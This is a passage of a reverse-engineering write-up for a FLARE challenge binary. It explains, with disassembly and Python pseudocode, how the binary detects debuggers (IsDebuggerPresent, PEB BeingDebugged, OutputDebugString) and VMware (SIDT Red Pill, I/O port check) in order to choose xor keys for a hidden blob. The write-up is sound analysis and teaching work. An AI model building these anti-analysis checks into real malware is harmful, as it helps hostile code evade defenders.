</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub_401130</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-3.jpg" alt="isDebuggerPresent" title="isDebuggerPresent" /></p>

<p>The result of a function call <code>isDebuggerPresent</code> is compared with 0 by <code>test eax, eax</code>. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value <code>0x106240</code> or <code>1073728</code> is loaded into <code>esi</code>. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>oh happy dayz</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. I am going to rename it to <code>blob</code> and the number <code>0x106240</code> to <code>blob_length</code>.</p>

<p>If debugger is present, we go left and the string <code>oh happy dayz</code> is xor-ed with the blob. If no debugger is present, we jump to the right branch and string <code>the final countdown</code> is xor-ed with the <code>blob</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>isDebuggerPresent </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">isDebuggerPresent</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;oh happy dayz&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;the final countdown&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-2---beingdebugged">Function 2 - BeingDebugged?</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">sub_4010C0</span>    <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub_401130</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Let’s forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting <code>var_4</code> to zero. The next jump will only happen if <code>var_4</code> is zero which means that the last jump should not have happened. If the first compare succeeds (meaning <code>[eax+2]</code> is 1) then we go left and otherwise right.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-4.jpg" alt="BeingDebugged" title="BeingDebugged" /></p>

<p>In both cases a string <code>UNACCEPTABLE!</code> or <code>omglob</code> are loaded along with address <code>byte_4131F8</code> before a function call <code>sub_401000</code>. The address points to a long stream of data.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-5.jpg" alt="blob" title="blob" /></p>

<p>Looking inside <code>sub_401000</code>. At the start <code>blob_length</code> is loaded into <code>ecx</code>. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>UNACCEPTABLE!</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. So <code>sub_401000</code> is <code>string xor blob</code>.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-6.jpg" alt="xor function" title="xor function" /></p>

<p>Now let’s go back to the first compare.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">004010</span><span class="nf">C6</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="mi">1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004010</span><span class="nf">CD</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nv">large</span> <span class="nb">fs</span><span class="p">:</span><span class="mh">30h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004010</span><span class="nf">D3</span> <span class="nv">cmp</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>What is the significance of <code>fs:30h</code>? It is the <code>Process Environment Block (PEB)</code> in the <code>Thread Information Block (TIB)</code>. According to <a href="http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx">MSDN</a> it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called <code>BeingDebugged</code> and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and <code>UNACCEPTABLE!</code> will be xor-ed with the <code>blob</code> otherwise <code>omglob</code>. More information about the <code>PEB</code> can be found in the first section of the PDF <code>1.NtGlobalFlag</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>PEB Structure </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PEB</span> <span class="p">{</span>
</span><span class="line">  <span class="n">BYTE</span>                          <span class="n">Reserved1</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class="line">  <span class="n">BYTE</span>                          <span class="n">BeingDebugged</span><span class="p">;</span>
</span><span class="line">  <span class="n">BYTE</span>                          <span class="n">Reserved2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class="line">  <span class="n">PVOID</span>                         <span class="n">Reserved3</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class="line">  <span class="n">PPEB_LDR_DATA</span>                 <span class="n">Ldr</span><span class="p">;</span>
</span><span class="line">  <span class="n">PRTL_USER_PROCESS_PARAMETERS</span>  <span class="n">ProcessParameters</span><span class="p">;</span>
</span><span class="line">  <span class="n">BYTE</span>                          <span class="n">Reserved4</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span>
</span><span class="line">  <span class="n">PVOID</span>                         <span class="n">Reserved5</span><span class="p">[</span><span class="mi">52</span><span class="p">];</span>
</span><span class="line">  <span class="n">PPS_POST_PROCESS_INIT_ROUTINE</span> <span class="n">PostProcessInitRoutine</span><span class="p">;</span>
</span><span class="line">  <span class="n">BYTE</span>                          <span class="n">Reserved6</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class="line">  <span class="n">PVOID</span>                         <span class="n">Reserved7</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class="line">  <span class="n">ULONG</span>                         <span class="n">SessionId</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span> <span class="n">PEB</span><span class="p">,</span> <span class="o">*</span><span class="n">PPEB</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>At this point we can rewrite this function in Python</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>BeingDebugged </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">BeingDebugged</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;UNACCEPTBALE!&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;omglob&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-3---vmware-detection-via-red-pill">Function 3 - VMware Detection via Red Pill</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">calls_isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub_401130</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-7.jpg" alt="SIDT Red Pill" title="SIDT Red Pill" /></p>

<p>Jumping into <code>sub_401130</code> we see an old anti-VM technique. This is called <a href="http://repo.hackerzvoice.net/depot_ouah/Red_%20Pill.html">The Red Pill</a>. Each CPU core has its own <code>Interrupt Descriptor Table (IDT}</code>. IDT is essentially an interrupt vector table. Because the VM manager is juggling two operating systems but there is one location per core, it has to relocate IDT of guest OS in memory. The application can check this location for known addresses assigned by VM managers and determine if it is running in a VM.</p>

<p>But how is this accomplished? Each core has one register called the <code>Interrupt Descriptor Table Register (IDTR)</code> that points to this location in memory. The userland (ring3) instruction<code>SIDT</code> will save this register. VM managers store the relocated tables in different places and the value of this register can act as a VM manager fingerprint.</p>

<p>According to <a href="http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html">this post</a> by Alain Zidouemba these are some of the addresses:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">VM Manager</th>
      <th style="text-align: left">Address</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">0x80FFFFFF</td>
    </tr>
    <tr>
      <td style="text-align: left">Virtual PC</td>
      <td style="text-align: left">0xE8XXXXXX</td>
    </tr>
    <tr>
      <td style="text-align: left">VMware</td>
      <td style="text-align: left">0xFFXXXXXX</td>
    </tr>
  </tbody>
</table>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>SIDT Red Pill </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401138</span> <span class="nf">sidt</span>    <span class="nv">fword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_8</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040113</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_8</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="c1">; edi = IDT address (in this run 0xBAB3C590)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040113</span><span class="nf">F</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span> <span class="c1">; 0x106240</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401145</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">edi</span>                     <span class="c1">; eax = edi = IDT address</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401147</span> <span class="nf">and</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">0FF000000h</span>              <span class="c1">; Getting the first byte of address</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040114</span><span class="nf">C</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040114</span><span class="nf">E</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">0FF000000h</span>              <span class="c1">; Comparing the first byte with 0xFF</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401153</span> <span class="nf">jnz</span>     <span class="nv">short</span> <span class="nv">loc_40119A</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The above compares the first byte of IDT address with <code>0xFF</code>. According to our table it is looking for <code>VMware</code>. But we are not running it. If this check passes (meaning we are not running VMware) the string <code>you're so bad</code> is going to be xor-ed with the blob, otherwise it will be <code>you're so good</code>. The address <code>0xBAB3C590</code> did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>VMware Detection via Red Pill </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">running_in_vmware</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;you&#39;re so good&quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;you&#39;re so bad&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-4---vmware-detection-2-electric-boogaloo">Function 4 - VMware Detection 2: Electric Boogaloo</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>What’s in the box?</p>

<p><img src="http://parsiya.net/images/2014/flare/7-8.jpg" alt="VMware detection 2" title="VMware detection 2" /></p>

<p>Function will create its own exception handler, it will return the execution to <code>loc_401232</code> if an exception occurs. Then we have some interesting instructions. If we look at the <a href="https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/">Malware Bytes</a> article, it is named <code>VMware I/O port</code>. These are the magic instructions:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>VMware I/O port check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">0040120</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">564D5868h</span>   <span class="c1">; save magic number to eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401213</span> <span class="nf">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0Ah</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401218</span> <span class="nf">mov</span>     <span class="nb">dx</span><span class="p">,</span> <span class="mh">5658h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040121</span><span class="nf">C</span> <span class="nv">in</span>      <span class="nb">eax</span><span class="p">,</span> <span class="nb">dx</span>          <span class="c1">; if in VMware, this instruction will save the magic number in ebx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040121</span><span class="nf">D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_1C</span><span class="p">],</span> <span class="nb">ebx</span>    <span class="c1">; executes if in VMware otherwise exception</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>It’s a quick way to find if the application is running in a VMware VM. If <code>in eax, dx</code> is successful, it will save the magic number in <code>ebx</code> and then <code>var_1C</code>. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then <code>var_1C</code> is compared to the magic number to determine if the application is in a VMware VM or not.</p>

<p>I was running the application in VirtualBox. Apparently Fireeye thinks we are all rich and use VMware ;) So the check failed.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-9.jpg" alt="VMware detection 2 continued" title=" VMware detection 2 continued" /></p>

<p>The rest of the function is pretty simple, if the check fails <code>0x66</code> (character <code>f</code>) will be xor-ed with the blob. If running in VMware <code>0x01</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>VMWare Detection 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">running_in_vmware</span><span class="p">):</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="mh">0x01</span><span class="p">)</span>
</span><span class="line"><span class="k">else</span><span class="p">:</span>
</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="mh">0x66</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h4 id="function-5---outputdebugstring">Function 5 - OutputDebugString</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>       <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><img src="http://parsiya.net/images/2014/flare/7-10.jpg" alt="OutputDebugString" title="OutputDebugString" /></p>

<p>This is almost the same as listing 16-1 in page 353 of <code>Practical Malware Analysis</code> book (<a href="http://books.google.com/books?id=FQC8EPYy834C&amp;pg=PA353&amp;dq=outputdebugstring&amp;hl=en&amp;sa=X&amp;ei=lcksVI7JM9bGsQSdpoGACA&amp;ved=0CDsQ6AEwBQ#v=onepage&amp;q=outputdebugstring&amp;f=false">Link to p.353 on Google Books</a>). First the current error code is set to <code>0x1234</code>. Then <code>OutputDebugString</code> is called with string <code>bah!</code>. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains <code>0x1234</code>. Later, last error code is retrieved by calling <code>GetLastError</code>, if this value is not changed then a debugger is attached to the application and string <code>Sandboxes are fun to play in</code> is xor-ed with blob. In the absence of a debugger, <code>I'm gonna sandbox your face</code> is used.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>OutputDebugString </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nf">if</span><span class="p">(</span><span class="nv">debugger_is_attached</span><span class="p">):</span>
</span><span class="line">    <span class="nf">blob</span> <span class="err">=</span> <span class="nv">xor</span><span class="p">(</span><span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span><span class="s">&quot;Sandboxes are fun to play in&quot;</span><span class="p">)</span>
</span><span class="line"><span class="nl">else:</span>
</span><span class="line">    <span class="nf">blob</span> <span class="err">=</span> <span class="nv">xor</span><span class="p">(</span><span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="s">&quot;I&#39;m gonna sandbox your face&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

